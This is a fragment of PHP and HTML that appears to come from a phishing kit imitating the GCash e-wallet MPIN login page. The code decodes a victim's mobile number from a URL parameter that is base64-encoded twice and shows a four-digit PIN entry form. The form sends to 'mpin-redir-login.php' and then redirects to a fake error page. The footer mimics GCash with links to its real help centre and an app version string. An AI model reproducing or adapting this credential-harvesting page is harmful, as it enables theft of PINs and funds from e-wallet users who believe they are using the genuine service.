...
if(isset($_GET['mobnumid'])){
  $mobile_num = base64_decode(base64_decode($_GET['mobnumid']));
  mpin_page($mobile_num);
} else{
  header("Location:index.php");
}

function mpin_page($mobile_num){
$input = $mobile_num;
$output = substr($input, -10, -7) . " " . substr($input, -7, -4) . " " . substr($input, -4); 
$ss = base64_encode(base64_encode($input));
...
<form method="POST">
    <div class="mpin-login" id="mainMpinLogin" >
      <input class="mpin" style="placeholder{color:black;}" readonly name="mpin" placeholder="&minus;&minus;&minus;&minus;" id="mympin" >
      <br><br>
    ...
    <script>
      new MpinLogin({
          ...
          loginEndpoint: "mpin-redir-login.php",
          redirectTo: "mpinerror2.php?mobcli2='.$ss.'",
          maxNumbers: 4
      });
    </script>
    ...
    <br><br><br><br><footer>
<a style="text-decoration:none;color:white;" href="https://help.gcash.com/hc/en-us"><span>Help Center</span></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#74b8ff;">v5.54.1.531</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a style="text-decoration:none;color:white;" href="https://help.gcash.com/hc/en-us"><span>Forgot MPIN?</span></a></footer>
